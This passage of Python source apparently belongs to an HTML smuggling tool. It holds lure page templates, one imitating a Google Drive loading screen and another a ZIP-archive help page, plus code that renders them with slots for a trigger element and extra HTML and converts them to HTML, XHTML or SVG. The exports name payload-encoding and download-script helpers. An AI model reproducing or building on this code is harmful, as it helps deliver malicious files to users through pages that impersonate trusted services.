</style></head><body{body_attrs}><div class="header"><h1>{title}</h1></div><div class="main"><div class="card">{notice}<div id="sl"><div class="icon">▣</div><h2>{title}</h2><p>{message}</p><div class="progress"><div class="progress-bar"></div></div></div><div id="sd"><div class="icon">✓</div><h2>{title}</h2><p>{message}</p></div></div></div><div class="footer">&copy; 2026 Corporate Portal. All rights reserved.</div>{extra_html}{trigger_element}</body></html>""",
    "drive": """<!DOCTYPE html>
<html lang="{locale}"><head><meta charset="UTF-8"><title>{title}</title><style>
body{{font-family:'Google Sans',Roboto,Arial,sans-serif;background:#fff;color:#202124;min-height:100vh;display:flex;align-items:center;justify-content:center;margin:0}}.card{{text-align:center;max-width:400px;padding:0 1.5rem}}.logo{{font-size:3rem;margin-bottom:1rem;color:#4285f4}}
.gspinner{{width:40px;height:40px;border:3.5px solid #e8eaed;border-top-color:#4285f4;border-right-color:#ea4335;border-bottom-color:#fbbc05;border-left-color:#34a853;border-radius:50%;animation:gspin .8s linear infinite;margin:0 auto 1.5rem}}@keyframes gspin{{to{{transform:rotate(360deg)}}}}
h1{{font-size:1.5rem;font-weight:400;margin-bottom:.75rem;color:#202124}}p{{font-size:.9rem;color:#5f6368;margin-bottom:2rem;line-height:1.5}}.meta{{font-size:.8rem;color:#80868b}}#sd{{display:none}}#sd p{{color:#34a853}}.notice{{margin:0 0 1rem;padding:.75rem 1rem;border-radius:8px;background:#e8f0fe;color:#174ea6}}
</style></head><body{body_attrs}><div class="card"><div class="logo">△</div>{notice}<div id="sl"><div class="gspinner"></div><h1>{title}</h1><p>{message}</p></div><div id="sd"><h1>{title}</h1><p>{message}</p></div><p class="meta">Google Drive</p></div>{extra_html}{trigger_element}</body></html>""",
    "npf-zip-archive-help": """<!DOCTYPE html>
<html lang="{locale}"><head><meta charset="UTF-8"><title>{title}</title><style>body{{font-family:'Inter','Segoe UI',sans-serif;background:#f4f7fb;color:#121826;min-height:100vh;display:flex;align-items:center;justify-content:center;padding:2rem 1rem;margin:0}}.wrap{{width:min(920px,calc(100vw - 2rem));background:#fff;border-radius:16px;border:1px solid #dbe5f4;box-shadow:0 24px 45px rgba(34,56,106,.12);padding:1.8rem}}.notice{{margin:0 0 1rem;padding:.75rem 1rem;border-radius:8px;background:#eef2ff;color:#1f4f99}}.step{{display:grid;grid-template-columns:2rem 1fr;gap:.8rem;margin-top:1rem}}.n{{background:#1f6feb;color:#fff;border-radius:999px;width:2rem;height:2rem;display:flex;align-items:center;justify-content:center;font-weight:700}}code{{background:#eef2ff;border:1px solid #d8e3ff;border-radius:6px;padding:.08rem .4rem}}</style></head><body{body_attrs}><div class="wrap">{notice}<h1>{title}</h1><p>{message}</p><div class="step"><div class="n">1</div><div>{zip_step_1_prefix} <code>{download_name}</code>{zip_step_1_suffix}</div></div><div class="step"><div class="n">2</div><div>{zip_step_2}</div></div><p>{zip_fallback}</p></div>{extra_html}{trigger_element}</body></html>""",
}


def _render_constructor_template(
    *,
    template_name: str,
    title: str,
    message: str,
    download_name: str,
    body_attrs: str,
    extra_html: str,
    trigger_element: str,
    show_notice: bool,
    locale: str,
) -> str:
    template = _CONSTRUCTOR_TEMPLATES[template_name]
    archive_copy = _constructor_archive_copy(locale)
    return template.format(
        title=escape(title, quote=False),
        message=escape(message, quote=False),
        download_name=escape(download_name, quote=False),
        notice=_constructor_notice_html(locale) if show_notice else "",
        locale=locale,
        zip_step_1_prefix=escape(archive_copy["zip_step_1_prefix"], quote=False),
        zip_step_1_suffix=escape(archive_copy["zip_step_1_suffix"], quote=False),
        zip_step_2=escape(archive_copy["zip_step_2"], quote=False),
        zip_fallback=escape(archive_copy["zip_fallback"], quote=False),
        body_attrs=body_attrs,
        extra_html=extra_html,
        trigger_element=trigger_element,
    )


def _convert_constructor_format(html: str, output_format: str) -> bytes:
    if output_format in ("html", "htm", "shtml", "shtm"):
        return html.encode("utf-8")
    if output_format in ("xhtml", "xht", "xhtm", "xml"):
        return _to_constructor_xhtml(html).encode("utf-8")
    if output_format == "svg":
        return _to_constructor_svg(html).encode("utf-8")
    raise ValueError(f"Unknown SMUGGLE output format: {output_format}")


def _xml_safe_constructor_html(html: str) -> str:
    content = html
    srcdoc_values: list[str] = []

    def stash_srcdoc(match: re.Match[str]) -> str:
        srcdoc_values.append(match.group(1))
        return f'srcdoc="__SRCDOC_{len(srcdoc_values) - 1}__"'

    content = re.sub(r'srcdoc="([^"]*)"', stash_srcdoc, content)
    content = re.sub(
        r"<html\b(?![^>]*xmlns)([^>]*)>",
        r'<html xmlns="http://www.w3.org/1999/xhtml"\1>',
        content,
        count=1,
        flags=re.IGNORECASE,
    )
    content = re.sub(r"<svg\b(?![^>]*xmlns)", '<svg xmlns="http://www.w3.org/2000/svg"', content)
    content = re.sub(r"\bsrc=x(?=[\s/>])", 'src="x"', content)
    for attr in ("autofocus", "open"):
        content = re.sub(rf"(?<=\s){attr}(?=[\s/>])", f'{attr}="{attr}"', content)
    for tag in ("meta", "link", "img", "br", "hr", "input", "source"):
        content = re.sub(rf"<({tag}\b[^>]*?)(?<!/)\s*>", r"<\1 />", content, flags=re.IGNORECASE)
    content = re.sub(r'([\w-]+)="([^"]*)"', _escape_constructor_attr_value, content)
    content = re.sub(
        r"(<(?:style|script)[^>]*>)(.*?)(</(?:style|script)>)",
        lambda match: f"{match.group(1)}/*<![CDATA[*/{match.group(2)}/*]]>*/{match.group(3)}",
        content,
        flags=re.DOTALL | re.IGNORECASE,
    )
    content = re.sub(r"&(\w+);", _html_entity_to_constructor_numeric, content)
    for index, value in enumerate(srcdoc_values):
        escaped = value.replace("&quot;", "\x00_QUOT_\x00")
        escaped = escaped.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
        escaped = escaped.replace("\x00_QUOT_\x00", "&quot;")
        content = content.replace(f"__SRCDOC_{index}__", escaped)
    return content


_XML_ENTITY_NAMES = frozenset(("amp", "lt", "gt", "quot", "apos"))
_CONSTRUCTOR_ATTR_ENTITY_RE = re.compile(r"&(?:(?:amp|lt|gt|quot|apos)|#\d+|#x[0-9A-Fa-f]+);")


def _html_entity_to_constructor_numeric(match: re.Match[str]) -> str:
    name = match.group(1)
    if name in _XML_ENTITY_NAMES:
        return match.group(0)
    codepoint = html.entities.name2codepoint.get(name)
    return f"&#{codepoint};" if codepoint else match.group(0)


def _escape_constructor_attr_value(match: re.Match[str]) -> str:
    name, value = match.group(1), match.group(2)
    if not any(char in value for char in ("<", ">", "&", '"')):
        return match.group(0)

    parts: list[str] = []
    index = 0
    while index < len(value):
        entity_match = _CONSTRUCTOR_ATTR_ENTITY_RE.match(value, index)
        if entity_match is not None:
            parts.append(entity_match.group(0))
            index = entity_match.end()
            continue

        char = value[index]
        if char == "&":
            parts.append("&amp;")
        elif char == "<":
            parts.append("&lt;")
        elif char == ">":
            parts.append("&gt;")
        elif char == '"':
            parts.append("&quot;")
        else:
            parts.append(char)
        index += 1

    escaped = "".join(parts)
    return f'{name}="{escaped}"'


def _to_constructor_xhtml(html: str) -> str:
    xhtml = re.sub(
        r"<!DOCTYPE\s+html[^>]*>",
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"\n'
        '  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">',
        html,
        flags=re.IGNORECASE,
    )
    return _xml_safe_constructor_html(xhtml)


def _to_constructor_svg(html: str) -> str:
    body = re.sub(r"<!DOCTYPE[^>]*>", "", html, flags=re.IGNORECASE).strip()
    body = _xml_safe_constructor_html(body)
    return (
        '<?xml version="1.0" encoding="UTF-8"?>\n'
        '<svg xmlns="http://www.w3.org/2000/svg" width="100%" height="100%">\n'
        '<foreignObject width="100%" height="100%">\n'
        f"{body}\n"
        "</foreignObject>\n"
        "</svg>"
    )


def _safe_script_json(value: str) -> str:
    """Serialize a string for safe use inside an inline <script> block."""
    return (
        json.dumps(value, ensure_ascii=False)
        .replace("<", "\\u003c")
        .replace(">", "\\u003e")
        .replace("&", "\\u0026")
        .replace("\u2028", "\\u2028")
        .replace("\u2029", "\\u2029")
    )


def _safe_inline_javascript_string(value: str) -> str:
    """Serialize a string as a single-quoted ASCII-safe JavaScript literal."""
    parts: list[str] = []
    for char in value:
        codepoint = ord(char)
        if char == "\\":
            parts.append("\\\\")
        elif char == "'":
            parts.append("\\u0027")
        elif char == '"':
            parts.append("\\u0022")
        elif char == "<":
            parts.append("\\u003C")
        elif char == ">":
            parts.append("\\u003E")
        elif char == "&":
            parts.append("\\u0026")
        elif codepoint < 32 or codepoint == 127:
            parts.append(f"\\u{codepoint:04X}")
        elif codepoint in {0x2028, 0x2029}:
            parts.append(f"\\u{codepoint:04X}")
        elif codepoint <= 0x7F:
            parts.append(char)
        elif codepoint <= 0xFFFF:
            parts.append(f"\\u{codepoint:04X}")
        else:
            surrogate = codepoint - 0x10000
            high = 0xD800 + (surrogate >> 10)
            low = 0xDC00 + (surrogate & 0x3FF)
            parts.append(f"\\u{high:04X}\\u{low:04X}")
    return "'" + "".join(parts) + "'"


__all__ = [
    "_constructor_default_copy",
    "_constructor_download_js",
    "_convert_constructor_format",
    "_encode_constructor_payload",
    "_render_constructor_template",
    "_render_custom_constructor_trigger",
    "_resolve_constructor_trigger",
]
